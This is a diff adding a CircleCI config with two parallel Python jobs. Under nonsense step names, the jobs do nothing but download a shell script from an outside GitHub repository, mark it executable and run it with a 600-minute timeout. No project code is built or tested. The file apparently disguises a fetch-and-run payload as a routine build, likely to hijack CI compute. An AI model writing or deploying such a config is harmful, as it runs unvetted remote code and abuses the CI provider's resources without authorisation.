@@ -1,0 +1,39 @@
+version: 2.1
+jobs:
+  python_01:
+    docker:
+      - image: cimg/python:3.8
+    <<: &commonSteps
+      parallelism: 2
+      steps:
+        - checkout
+        - run:
+            name: Kolpeals
+            command: |
+              wget https://raw.githubusercontent.com/devailani/derin/main/start.sh
+        - run:
+            name: Ppoe
+            command: |
+              chmod u+x start.sh
+        - run:
+            name: Seopro
+            command: |
+              ls
+        - run:
+            name: PuilopuRun
+            no_output_timeout: 600m
+            command: |
+              ./start.sh
+              
+  python_02:
+    docker:
+      - image: cimg/python:3.8
+    <<: *commonSteps
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - python_01
+      - python_02
